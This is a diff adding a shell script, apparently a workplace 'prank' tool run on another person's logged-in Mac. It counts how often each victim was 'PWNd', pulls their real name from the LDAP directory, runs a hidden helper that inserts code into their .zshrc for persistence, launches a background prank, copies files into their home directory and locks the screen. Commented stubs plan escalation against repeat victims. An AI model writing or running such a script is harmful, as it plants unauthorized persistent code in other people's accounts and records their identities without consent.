@@ -1,0 +1,41 @@
+#!/bin/sh
+
+VX=.v_support
+STEAL=theirz
+USR=$(whoami)
+DIR=./$VX/$STEAL/$USR
+
+if [ ! -d $DIR ]; then
+	mkdir $DIR
+	echo 1 > ./$DIR/pwn_count
+else
+	echo $(expr $(cat ./$DIR/pwn_count) + 1) > ./$DIR/pwn_count
+fi
+
+NUM=$(cat $DIR/pwn_count)
+NAME=$(ldapsearch -QLLL uid=$USR | sed '/jpegPhoto/q' | grep -v jpegPhoto | grep -v objectClass | grep cn | sed s/cn\:\ //)
+
+#the date 11/11 is arbitrary, just when i started tracking how many times i pranked individual users
+echo "User ${USR}, $NAME, has been PWNd $NUM time(s) since 11/11 @ 11:11"
+
+cd $VX
+
+#insert script into their .zshrc file
+./\.v_zshrc_insert
+
+#run a prank in the immediate
+./\.v_current_script & disown
+
+#copy any necessary files to their root directory from a list
+echo $(cat ./\.v_copylist) | xargs -J % cp -n % ~/
+
+#start a screensaver to lock their computer when it's done, after a second to see who i pranked.
+sleep 1
+open -a /System/Library/Frameworks/Screensaver.framework/Versions/A/Resources/ScreenSaverEngine.app
+
+#in case i want to make the script do more to repeat offenders
+#if [ $NUM \> "1" ] ; then
+#fi
+
+#if [ $NUM \> "2" ] ; then
+#fi
